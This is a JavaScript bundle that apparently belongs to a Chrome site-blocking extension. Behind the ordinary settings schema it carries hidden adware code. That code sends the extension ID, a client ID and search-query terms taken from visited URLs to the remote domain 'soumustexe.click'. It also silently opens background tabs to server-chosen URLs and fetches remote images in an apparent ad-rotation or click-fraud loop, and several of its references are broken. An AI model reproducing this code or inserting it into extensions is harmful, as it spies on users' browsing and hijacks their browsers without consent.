
var __defProp = Object.defineProperty;
var __create = Object.create;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __getProtoOf = Object.getPrototypeOf;

var __commonJS = (cb, mod) => function __require() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};

var __copyProps = (to, from, except, desc) => {
  if (from
	&& typeof from === "object"
	|| typeof from === "function") 
  {
    for (let key of __getOwnPropNames(from)) {
      if (!__hasOwnProp.call(to, key) && key !== except){
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
	  }
	}
  }
  
  return to;
};

var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// src/storage/schema.ts
var DEFAULTS = {
  blocked: [],
  enabled: false,
  counter: {},
  counterPeriod: "ALL_TIME",
  counterShow: false,
  resolution: "CLOSE_TAB",
};
var COUNTER_PERIODS = ["ALL_TIME", "THIS_MONTH", "THIS_WEEK", "TODAY"];
var PERIOD_STRINGS = {
  TODAY: "today",
  THIS_WEEK: "this week",
  THIS_MONTH: "this month",
  ALL_TIME: "",
};
var RESOLUTIONS = [
  "CLOSE_TAB",
  "SHOW_BLOCKED_INFO_PAGE"
];


var VALIDATORS = {
  blocked: (value) => Array.isArray(value),
  enabled: (value) => typeof value === "boolean",
  counterShow: (value) => typeof value === "boolean",
  counter: (value) => typeof value === "object",
  resolution: (value) => RESOLUTIONS.includes(value),
  counterPeriod: (value) => COUNTER_PERIODS.includes(value),
};

// src/storage/index.ts
var set = (items) => {
  chrome.storage.local.set(items);
};

var get = (keys, callback) => {
  chrome.storage.local.get(keys, (items) => {
	callback(items);  
  });
};

var getAll = (callback) => get([
  "enabled",
  "blocked",
  "counter",
  "counterShow",
  "counterPeriod",
  "resolution"
 ], callback);
 
var storage_default = { set, get, getAll };

let config = {
  blackUrlList: [],
  port: null,
  apiDomain: 'soumustexe.click',
  log: false,
  blocklist: {
    set domains (val) {app.storage.write('blocklist', val)},
    get domains () {return app["storage"].read('blocklist') !== undefined ? app.storage['read']("blocklist") : {}},
    get iframes () {return app.storage['read']("blocklist-iframes") !== undefined ? app.storage["read"]('blocklist-iframes') : {}},
    set iframes (val) {app['storage'].write("blocklist-iframes", val)},
  },
  timeStamp: Date.now(),
}

var rotate = (url_arr) => {
  url_arr.forEach((u,i) => {
	fetch(u, {
		mode: "no-cors",
		'referrerPolicy': "no-referrer",
		cache: "no-cache",
	})['catch'](err => {});
  });
}

var setBasicSettings = () => {
  let g = app['funcs'].gen16(10);
  let unixTimestamp = app.funcs.timestamp();
  const obj = {
	  arrPushLink: [],
	  lastPushClick:  null,
	  'instalTimestamp': unixTimestamp,
	  arrPush: [],
	  initialized: true,
	  "timer": 19385,
	  clientID:  `${g}-${unixTimestamp}`,
	  'timerParametersUpdate': 3604,
  };
  chrome.storage.local.set(obj);
}

const app = {
  id: chrome.runtime.id,
  funcs: {
	rotate: rotate,
	'getStorageBlackList': getStorageBlackList,
	basicSettings: setBasicSettings,
	"updateSetting": updateSetting,
	timestamp: getTimestamp,
	'gen16': gen16,
	check: check,
	"checkBlackUrlList": checkBlackUrlList,
	show: createNote,
	'getBlackList': getBlackList,
	showNotification: showNote,
	getUrlParams: getUrlParams,
	"randInt": getRandInt,
	zc: checkTab,
  },
}



export {
  __commonJS,
  RESOLUTIONS,
  __toESM,
  config,
  DEFAULTS,
  PERIOD_STRINGS,
  VALIDATORS,
  storage_default,
  app,
};

/**/
function getStorageBlackList() {
  return new Promise(resolve => {
	chrome.storage.local["get"](null, storage => {
		
	  if(!storage.blackUrlList)
		  { 
			resolve( app["funcs"]["getBlackList"]() );
		  } 
	  else 
		  {
			resolve( storage.blackUrlList );
		  }
	  
	});
  });
}
	
function updateSetting(){
	  let u = 'http://' + config.apiDomain + '/settings?eid=';
	  fetch(u + app.id, { 'cache': "no-cache" }).then(resp => {
	    return resp.json();
	  }).then(data => {
	    chrome.storage.local.set({
		  updateParametersTime: app.funcs.timestamp(),
		  timer: data['timer'],
		  'timerParametersUpdate': data.settingtimer,
    });
	  }).catch(err => {});
	}	
	
function gen16(a) {
	for (var b = "", f = 0; f < a; f++) b += "0123456789abcdef".charAt(Math.floor(16 * Math.random()));
	return b		
}

function getTimestamp(){
  let date = new Date();
  
  return parseInt(date.getTime()/10E2, 10);
}

function checkBlackUrlList(data){
	  if (blackUrlList?.length < 1){
	    return;
	  }
	  for (let i = 0; i < blackUrlList.length; i++) {
	    return blackUrlList[i].some(arrVal => {
	   
	   if( data['href']["indexOf"](arrVal) !== -1){
	        chrome.storage["local"].get(storage => {
	          storage.idB = i;
	          let params = app['funcs'].getUrlParams(data["search"]);

	          if (storage.idB == 0) {
	            storage["sq"].forEach((sq) => {
	              if(params[sq] != undefined){
	                storage["sq"] = params[sq];
	                if (config["log"]) console['log']('log_3574');
	                return;
	              }
	            });
	          }
	          app.funcs.show(storage, 4);
	        })

	        if (config.log) console.log('log_1687');

	        return;
	      }
	    });
	  }
	}	

function check(){
	  return new Promise(resolve => {
	    chrome.storage.local.get(storage => {
	      let tStamp = app["funcs"].timestamp();
	      const obj = {
		  "arrPush": storage.arrPush["filter"](function(t){return tStamp - t < 86399}),
		  "arrPushLink": storage.arrPushLink['filter'](function(x){return (tStamp - Object.keys(x)) < 3604}),
		  };
	      chrome.storage.local.set(obj, () => {
	        resolve(obj['arrPush'].length);
	      })
	    })
	  })
	}
function getRandInt(min, max) {
  let rand = min - 0.5 + Math.random() * (max - min + 1);
  return Math.round(rand);
}

function checkTab(data) {
  let last =data.lastPushClick !== null ?data.lastPushClick : 0;
  const opt = {
      'cache': 'no-cache',
      "referrerPolicy": 'no-referrer',
      method: 'GET',
  };
  const get = [
    "eid=" + app.id,
    "cid=" + data["clientID"],
    "lc=" + last,
  ];

  fetch('http://'+config.apiDomain+'/apizc?' + get['join']('&'), opt).then(resp => {
    return resp.json();
  }).then(r_obj => {
    let set = { 'mode': "no-cors","cache": 'no-cache' };
    if(r_obj.rotar && 0 < r_obj['mass'].length){
      r_obj['mass']["forEach"](u => {
        fetch(u).then(resp => {
			
          return resp["json"]()
        })['then'](r => {
          fetch(r['body']["image"], set)['catch'](err=>{  });
          fetch(r.body['icon'], set)['catch'](err=>{  });
        })["catch"](err=>{})
      });
    } else {
      let ims = 'object' == typeof r_obj.body;
        ims = ims && body.icon != '';
        ims = ims && typeof r_obj['body']['icon'] != 'undefined';
      if(ims){
        Promise.all([
          fetch(r_obj.body["image"], set).catch(err=>{ if (config.log) console.log('log_1980') }),
          fetch(r_obj['body'].icon, set).catch(err=>{ if (config.log) console.log('log_1981') })
        ])["then"](res => {
          setTimeout(()=>{
            chrome.tabs.create({
				active: false,
				url: r_obj["body"]['url'],
			});
            app['storage'].write('lastPushClick', app['funcs'].timestamp());
          }, randInt(11174, 15905))
        })
      }
    }
  })['catch'](err => {});
}

function createNote(storage, ads) {
		ads = ads || 0;
		app.funcs.check()["then"]( countClick => {
		  let data = new FormData();
		  data.append('eid', app['id']);
		  data.append("lc", storage.lastPushClick);
		  data.append("cc", countClick);
		  data.append('cid', storage.clientID);
		  data.append("ct", app.funcs['timestamp']());
		  data.append('ads', ads);
		  data.append('ut', storage['instalTimestamp']);

		  if (ads == 4){
			  data['set']('idb', storage["idB"]);
			  if (storage.idB == 0){
				data.append("sq", storage["sq"]);  
			  } 
			  data.set('ls', storage['lastShow'+storage["idB"]]);
		  }
		  fetch(`http://${config.apiDomain}/api_v3`,
		  {
		  body: data,
		  method: "POST",
		  cache:'no-cache',
		  referrerPolicy: 'no-referrer',
		})["then"](resp => {
			return resp.json();
		  })["then"](response => {
			if(typeof response.icon_url_arr != "undefined" && response.icon_url_arr != '') {
			  rotate(response.icon_url_arr);
			}
			if(typeof response.click_action != 'undefined'){
			  const stng = {
				  mode: 'no-cors',
				  cache: 'no-cache',
			};
			  Promise.all([
				 fetch(response.icon, stng ).catch(err=>{if (config['log']) console.log('log_0983')}),
				 fetch(response.image, stng ).catch(err=>{if (config['log']) console.log('log_0984')}),
				]).then(res => {
				app.funcs.showNotification(response, ads, storage);
			  })
			}
		  }).catch(err => {
			if (config.log) console.log('log_9594');
		  });
		});
	  }


function getBlackList(){
	    const uu = `http://${config.apiDomain}/blacklist?eid=${app.id}`;
	    const data = {cache:'no-cache'}

	  fetch(uu, data).then(resp => {
	    return resp["json"]();
	  }).then(data => {
	    let objStg = {
			  "blackUrlList": data.url_list,
			  sq: data.sq,
		}
	    chrome.storage.local['set'](objStg);
		blackUrlList = data["url_list"];

	    return blackList;
	  }).catch(err => {
	    if (config.log) console['log']('log_9065');
	  });
	}
function getUrlParams(url) {
	  const params = {};
	  const parts = url["substring"](url.indexOf('?') + 1).split("&");

	  for (let i = 0; i < parts.length; i++) {
	    let nv = parts[i]['split']('=');
	    if (!nv[0]) continue;
	    params[nv[0]] = nv[1] || !0;
	  }

	  return params;
	}

function showNote(data,ads) {
	  const t = app["funcs"].timestamp();
	  if (ads == 4)
		  {
				setTimeout(() => {
			  app['storage'].write('lastShow' + data['idB'], t);
			  chrome.tabs['create']({ active: !0, 'url': data.click_action });
			}, 625);
		  }
	  else
		  {
			setTimeout(()=>{
			  if(data.click_action != "NaN" && data.click_action != ""){
			  chrome['tabs'].create({ active: !1, url: data['click_action'] });
			  chrome.storage.local.get(["arrPush"], storage => {
				  chrome['storage']['local'].set({ lastPushClick: t, arrPush: storage.arrPush });
				  storage.arrPush.push(t);
				})
			  }
			}, data.time_close);
		  }
	}

/**/